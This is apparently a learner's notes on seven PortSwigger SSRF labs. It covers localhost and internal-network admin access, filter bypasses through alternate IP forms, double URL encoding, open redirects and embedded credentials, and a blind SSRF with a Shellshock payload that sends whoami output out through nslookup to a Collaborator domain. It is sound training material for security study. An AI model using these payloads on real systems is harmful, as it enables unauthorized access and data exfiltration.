- https://portswigger.net/web-security/ssrf
- https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery

## **1. Basic SSRF against the local server**
This lab has a stock check feature which fetches data from an internal system.
To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`

1. Browse to `/admin` and observe that you can't directly access the admin page.
2. Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
3. Change the URL in the `stockApi` parameter to `http://localhost/admin`. This should display the administration interface.
4. Read the HTML to identify the URL to delete the target user, which is:
    `http://localhost/admin/delete?username=carlos
5. Submit this URL in the `stockApi` parameter, to deliver the [SSRF attack](https://portswigger.net/web-security/ssrf).


**Analysis**:
1. we observe that we have an API parameter which does a request directly to the local server. In this case we will try to manipulate it in order to do request in our behalf.
	![[Pasted image 20241001150727.png]]
	![[Pasted image 20241001150837.png]]

2. after sending the request we cant delete directly the accounts so we have to inspect the delete button in order to execute the request from the server side (not user)
	![[Pasted image 20241001150956.png]]
	![[Pasted image 20241001151253.png]]


## **2.  Basic SSRF against another back-end system**
This lab has a stock check feature which fetches data from an internal system.
To solve the lab, use the stock check functionality to scan the internal `192.168.0.X` range for an admin interface on port 8080, then use it to delete the user `carlos`.

1. Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Intruder.
2. Click "Clear §", change the `stockApi` parameter to `http://192.168.0.1:8080/admin` then highlight the final octet of the IP address (the number `1`), click "Add §".
3. Switch to the Payloads tab, change the payload type to Numbers, and enter 1, 255, and 1 in the "From" and "To" and "Step" boxes respectively.
4. Click "Start attack".
5. Click on the "Status" column to sort it by status code ascending. You should see a single entry with a status of 200, showing an admin interface.
6. Click on this request, send it to Burp Repeater, and change the path in the `stockApi` to: `/admin/delete?username=carlos`

**Analysis:**
1. ![[Pasted image 20241001175528.png]]

2. using the stock check functionality in order to scan the internal 192.168.0.x range for an admin interface on port 8080   ![[Pasted image 20241001175615.png]]
	![[Pasted image 20241001175639.png]]
	![[Pasted image 20241001175707.png]]

3. accessing admin panel
	![[Pasted image 20241001175814.png]]
	![[Pasted image 20241001175832.png]]

## **3. Blind SSRF with out-of-band detection**
This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.
To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server.

1. Visit a product, intercept the request in Burp Suite, and send it to Burp Repeater.
2. Go to the Repeater tab. Select the Referer header, right-click and select "Insert Collaborator Payload" to replace the original domain with a Burp Collaborator generated domain. Send the request.
3. Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.
4. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.

**Analysis**:
The vulnerable parameter is the `Referer` header:
The `Referer` header in HTTP requests is used to identify the address (URL) of the webpage from which a request originated. When a browser sends a request to a web server, it can include the `Referer` header to indicate the URL of the page that linked to the resource being requested.
- **Purpose**: It tells the server where the request came from (the referring URL). This can be used for analytics, logging, and security purposes.
- **Usage**: It is commonly used in browsers when navigating between web pages or when clicking links, so the destination server knows the origin of the traffic.
- **Privacy Concerns**: The `Referer` header can expose sensitive information, such as query parameters or parts of the URL that contain private data. For example, if a user submits a form on one page and is redirected to another, the `Referer` might contain sensitive data.
- **Control**: Web developers can control the behavior of the `Referer` header using various techniques:
    - **`Referrer-Policy` Header**: A web server can set this header to control how and when the `Referer` information is sent (e.g., stripping it out entirely or only sending the origin without query strings).
    - **Same-Origin Policy**: Browsers may limit `Referer` information to prevent cross-site tracking.
    
### Example Policies for Referer Handling:
1. `no-referrer`: Completely omits the `Referer` header.
2. `no-referrer-when-downgrade`: Default policy that sends the header only if the request is sent over the same or a more secure protocol.
3. `origin`: Sends only the origin (e.g., `https://example.com`) without the full path.
4. `strict-origin`: Sends the origin only when navigating to the same security level (e.g., HTTPS to HTTPS, but not HTTPS to HTTP).
	![[Pasted image 20241001181535.png]]
-  we will inject our collaborator server into the referer header position in order to execute an out of band SSRF ![[Pasted image 20241001182113.png]]

## **4. SSRF with blacklist-based input filter**
This lab has a stock check feature which fetches data from an internal system.
To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

The developer has deployed two weak anti-SSRF defenses that you will need to bypass.

1. Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
2. Change the URL in the `stockApi` parameter to `http://127.0.0.1/` and observe that the request is blocked.
3. Bypass the block by changing the URL to: `http://127.1/`
4. Change the URL to `http://127.1/admin` and observe that the URL is blocked again.
5. Obfuscate the "a" by double-URL encoding it to %2561 to access the admin interface and delete the target user.

**Analysis**:
1. vulnerable parameter: `stockApi`
	![[Pasted image 20241002165334.png]]

2. we will modify stock.weliketoshop.net to be redirected to local host address(127.0.0.1) by the server (also delete the port number 8080)
	![[Pasted image 20241002165652.png]]

3. it seems to be blacklisted and we have to workaround to bypass that 
	127.0.0.1 == 127.1 == localhost
		![[Pasted image 20241002165946.png]]

4. now we get another error which seems to be different (it seems that we have bypassed the security blacklist)
	![[Pasted image 20241002170053.png]]

5. quick brute forcing of directories using a list and intruder and we have found the `admin` to be a valid one
	![[Pasted image 20241002170302.png]]

6. it seems that our request is blocked again so in order to bypass it we will double URL encode the admin string (using hackvertor extension of burp) ( url encode all --> convert tags)
	![[Pasted image 20241002170504.png]]

7. we will append `/delete?username=carlos` to our admin url 
	![[Pasted image 20241002170632.png]]


## **5. SSRF with filter bypass via open redirection vulnerability**
This lab has a stock check feature which fetches data from an internal system.
To solve the lab, change the stock check URL to access the admin interface at `http://192.168.0.12:8080/admin` and delete the user `carlos`.

The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.

1. Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
2. Try tampering with the `stockApi` parameter and observe that it isn't possible to make the server issue the request directly to a different host.
3. Click "next product" and observe that the `path` parameter is placed into the Location header of a redirection response, resulting in an open redirection.
4. Create a URL that exploits the open redirection vulnerability, and redirects to the admin interface, and feed this into the `stockApi` parameter on the stock checker:
    `/product/nextProduct?path=http://192.168.0.12:8080/admin`
5. Amend the path to delete the target user:
    `/product/nextProduct?path=http://192.168.0.12:8`

**Analysis**:
1. after decoding the `stockapi` parameter we observe that is not using a URL as http://example.com to make a request to a different host (it using a redirecting url)
	![[Pasted image 20241002202146.png]]
	
2. if we try to modify i, we get a error on this topic so we need to change our approach and find a redirect link(see next product page)
	![[Pasted image 20241002202326.png]]
	![[Pasted image 20241002202550.png]]

3.  we will use the url of the next-product page to test execution of an open redirect 
	![[Pasted image 20241002202855.png]]

4. copy this request back into the `stockApi` parameter(URL encode it) in order to make a request towards the `admin` host page.
	**note**: we have to fuzz trough all list ip range to find out that one that is running in 8080 port (in our case is 192.168.0.**12**:8080)
	![[Pasted image 20241002203438.png]]
	![[Pasted image 20241002203759.png]]


## **6. Blind SSRF with Shellshock exploitation**
This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

To solve the lab, use this functionality to perform a [blind SSRF](https://portswigger.net/web-security/ssrf/blind) attack against an internal server in the `192.168.0.X` range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user.

1. Observe that when you load a product page, it triggers an HTTP interaction with Burp Collaborator, via the `Referer` header.
2. Observe that the HTTP interaction contains your `User-Agent` string within the HTTP request.
3. Send the request to the product page to Burp Intruder.
4. Go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab and generate a unique Burp Collaborator payload. Place this into the following Shellshock payload:
    `() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN`
5. Replace the `User-Agent` string in the Burp Intruder request with the Shellshock payload containing your Collaborator domain.
6. Change the `Referer` header to `http://192.168.0.1:8080` then highlight the final octet of the IP address (the number `1`), click **Add §**.
6. In the **Payloads** side panel, change the payload type to **Numbers**, and enter 1, 255, and 1 in the **From** and **To** and **Step** boxes respectively.
7. Click  **Start attack**.
8. When the attack is finished, go to the **Collaborator** tab, and click **Poll now**. If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously. You should see a DNS interaction that was initiated by the back-end system that was hit by the successful blind [SSRF attack](https://portswigger.net/web-security/ssrf). The name of the OS user should appear within the DNS subdomain. To complete the lab, enter the name of the OS user.

**Analysis**:
1. we observe two vulnerable parameters: `User-Agent` & `Referer`
	![[Pasted image 20241002205157.png]]

2. we can exploit the `User-Agent` parameter for a ShellShock payload:
```
() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
```
![[Pasted image 20241002205444.png]]

3. we also need to blind SSRF via `Referer` parameter, fuzzing the ip range as we did in previous examples.
	![[Pasted image 20241002205727.png]]
	
4. we have received the response for whoami on our server via the shellshock
	![[Pasted image 20241002210051.png]]

	**Shellshock** exploits a vulnerability in how Bash processes environment variables. Bash can use specially formatted strings in environment variables to execute commands when it’s invoked. This allows attackers to inject malicious code into those environment variables, which then gets executed by Bash. The flaw arises because Bash doesn't properly sanitize these environment variables before executing them.
	
	**Vulnerability Impact**:
	Shellshock allows attackers to execute arbitrary commands on a vulnerable machine. This means they can gain unauthorized access to a system, modify data, steal information, or use the system for further attacks.
	
	### **How Shellshock is Exploited**:
	An attacker can exploit Shellshock in a variety of ways, but common attack vectors include:
	
	- **CGI Scripts**: Many web servers use CGI scripts written in Bash to interact with users. If an attacker sends a request with malicious environment variables, the vulnerable Bash shell will execute arbitrary code.
	- **OpenSSH**: Systems that use Bash for processing SSH commands and have shell access may also be vulnerable if attackers can set environment variables during login.
	- **DHCP (Dynamic Host Configuration Protocol)**: Some DHCP clients invoke Bash to configure network settings, allowing attacks via DHCP responses from a malicious server.
	
	One of the simplest ways to exploit Shellshock is through a CGI script on a web server. Here’s an example of a malicious HTTP request targeting a vulnerable Bash shell via an environment variable:
		`GET /cgi-bin/test.cgi HTTP/1.1 Host: target.com User-Agent: () { :; }; echo; /bin/bash -c "echo Hello World"` 

	- The `User-Agent` field (which is normally used to specify the browser type) is crafted to exploit the vulnerability.
	- The payload `() { :; };` tells Bash to treat the content as a function definition, followed by arbitrary code (in this case, `echo Hello World`).


## **7. SSRF with whitelist-based input filter**
This lab has a stock check feature which fetches data from an internal system.
To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

The developer has deployed an anti-SSRF defense you will need to bypass.

1. Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
2. Change the URL in the `stockApi` parameter to `http://127.0.0.1/` and observe that the application is parsing the URL, extracting the hostname, and validating it against a whitelist.
3. Change the URL to `http://username@stock.weliketoshop.net/` and observe that this is accepted, indicating that the URL parser supports embedded credentials.
4. Append a `#` to the username and observe that the URL is now rejected.
5. Double-URL encode the `#` to `%2523` and observe the extremely suspicious "Internal Server Error" response, indicating that the server may have attempted to connect to "username".
6. To access the admin interface and delete the target user, change the URL to:
    `http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos`

**Analysis**:
1. 
	![[Pasted image 20241003211211.png]]
	![[Pasted image 20241003211718.png]]

2. append the required url string to the localhost (localhost@....) instead of 127.0.0.1 
  ![[Pasted image 20241003211941.png]]

3. obfuscate the url parsing using `#` and double encoded it 
	![[Pasted image 20241003212239.png]]

	![[Pasted image 20241003212338.png]]

4. find the admin page
	![[Pasted image 20241003212410.png]]